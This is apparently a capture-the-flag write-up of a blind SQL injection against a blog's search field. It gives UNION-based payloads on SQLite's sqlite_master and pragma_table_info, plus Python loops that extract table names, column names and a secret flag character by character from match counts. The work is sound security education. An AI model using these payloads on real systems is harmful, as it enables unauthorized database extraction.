# Challenge `Sometimes we are just temporarily blind` Writeup

- Vulnerability:
  - SQL Injection attack
- Where:
  - Search blog posts text field
- Impact:
  - allows users to find a hidden secret in the database

## Steps to reproduce

### Step 0: Analyzing the server
The search query in the search field remains the same as the last challenge: `SELECT id, title, content FROM blog_post WHERE title LIKE '%%'%' OR content LIKE '%%'%'` (by inputting `%'`). However, this time the only feedback we get from the server is the number of articles matching the search query.

### Step 1: Finding existing tables
Since we don't where the secret is we must start by finding which tables exist in the database.
By using the search feedback it is possible to create a query to find the name of the existing tables letter by letter.
`q' UNION SELECT tbl_name, type, NULL FROM 'sqlite_master' WHERE type='table' AND substr(tbl_name,1,{i}) == '{match}'; --`, the fields `{i}` and `{match}` are used to iterate over the table name.
The `substr` function allows the query to be case sensitive.

First we start by finding the first letters of the table names to easy the search afterwards.
```python
results = []
    
# All possible characters
a = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ" + '{' + '}' + '_' + ':' + ' '

# Find initial letters of results to easy the search afterwards
for l in a:
    r = session.get(URL + payload(l, 1))
    n = r.text.split("Found ")[1].split(" ")[0]
    if n != "0":
        results.append(l)
```

Once we have all the first letters of the table names we can find the full name of the tables.
```python
# Find the rest of the letters of the results
while len(results) != 0:
    for el in results:
        for l in a:
            r = session.get(URL + payload(el + l, len(l + el)))
            n = r.text.split("Found ")[1].split(" ")[0]
            if n != "0":
                results.append(el + l)
        results.remove(el)
                
    print(results)
```

By printing the results we can see that the table `super_s_sof_secrets` exists.

### Step 2: Finding existing columns of the table `super_s_sof_secrets`
After we know the name of the table we can find the name of the columns. To do so we use the `pragma_table_info` which can be used to query information about a specific table. The result set will contain one row for each column in the table. The query used is `q' UNION SELECT name, NULL, NULL FROM pragma_table_info('super_s_sof_secrets') WHERE substr(name,1,{i}) == '{match}'; --` and we repeat the steps above in order to find the name of the columns.
By printing the results we can see that the column `secret` exists.

### Step 3: Finding the flag
Now that we know the name of the table and the column we can find the flag. The query used this time is `q' UNION SELECT secret, NULL, NULL FROM 'super_s_sof_secrets' WHERE substr(secret,1,{i}) == '{match}'; --` and we repeat the steps above in order to find the flag.
By printing the results we can obtain the flag.

## Implementation

The full implementation can be found [here](sometimes-we-are-just-temporarily-blind.py).